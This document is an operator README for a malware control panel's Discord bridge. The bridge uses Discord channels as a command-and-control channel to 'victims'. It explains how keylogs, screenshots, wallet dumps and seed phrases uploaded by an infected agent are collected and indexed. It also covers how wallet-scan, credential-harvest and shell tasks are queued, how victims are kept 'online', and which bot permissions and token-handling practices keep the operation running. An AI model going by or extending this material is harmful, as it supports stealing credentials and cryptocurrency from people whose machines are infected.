# Discord bridge (panel sin VPS)

The bridge lets the local panel work entirely over Discord, with no inbound port and
no VPS. The panel only makes outbound HTTPS requests to Discord.

## How it works

- `services/discord-bridge.ts` reads the bot token from `discord.json` (or
  `DISCORD_TOKEN` + `DISCORD_GUILD_ID`), polls the guild channels whose names start
  with `sync-`, and maps each channel to a victim under the `universal` build.
- Agent attachments (`.zip`, `.txt`, `.png`, `.partNNN`) are downloaded, reassembled,
  extracted and indexed as artifacts, wallet rows, screenshots, keylogs and seeds.
- Agent chat notices (`wallet detected`, `password?`, `clipboard:`, `seed escrita`)
  become events and table rows.
- The bridge creates a per-channel webhook `SPC Console` and posts panel tasks through it;
  the agent ignores messages from its own bot account.
- `Task <name> queued` is only an acknowledgement. A task closes on its artifact
  (`wallets` → `scan_wallets`, `screenshot` → `screenshot`, `harvest` → `harvest`) or
  on the JSON result (`result-<task>-<id>.json`) the crypto module uploads when the
  API is unreachable. Shell output closes shell tasks. A task without a result fails
  with `timeout:` when its lease expires.
- Deleting a victim keeps its channel in `DiscordIgnore`; the sweep skips it until an
  admin presses **re-link** on Victims. Recreating a deleted channel reattaches the
  link by `sync-<host>-<user>` instead of creating a second victim.
- Every 10 minutes the bridge posts `ping`; replies update `lastAgentMessageAt` and keep the
  victim online. The ping is deleted after 60 s, and old pings are cleaned at startup.
  Presence still comes from the heartbeat or this last real agent message, never from a
  bridge send.

## Requirements

- Bot with **View Channels**, **Read Message History**, **Send Messages**,
  **Attach Files** and **Manage Webhooks** in the category.
- `MESSAGE_CONTENT` intent is not needed for REST polling, only attachments/content.
- The panel must be running to ingest. Messages stay in Discord and are processed
  when it starts again, up to Discord retention.

## Limits and risk

- Discord can read everything: artifacts travel unencrypted and the token sits in
  the channel. This is weaker than the HTTPS API.
- 10 MB per attachment (existing agent splits above 8 MB into `.partNNN`).
- Rate limits: 4 s per channel poll, 220 ms between channels.
- Channel deletion marks the link `missing`; the victim page shows **channel
  missing** and tasks fail with `discord_channel_missing`. Recreate the channel with
  the same `sync-<host>-<user>` name and the sweep reattaches it.
- Large wallet dumps cost bandwidth and Discord storage.

## Configuration

```env
DISCORD_BRIDGE=1
# optional overrides, otherwise ../discord.json
DISCORD_TOKEN=
DISCORD_GUILD_ID=
```

`GET /api/console/discord/status` shows connection, polls and files ingested.

## Security

- Keep the bot token local; anyone with it controls the guild's channels.
- The bot only needs one guild. Do not grant Administrator.
- Rotate the token in the Discord developer portal and `discord.json` if leaked.
- For real confidentiality, keep the HTTPS API as the primary transport and use
  Discord only as the fallback it already is.
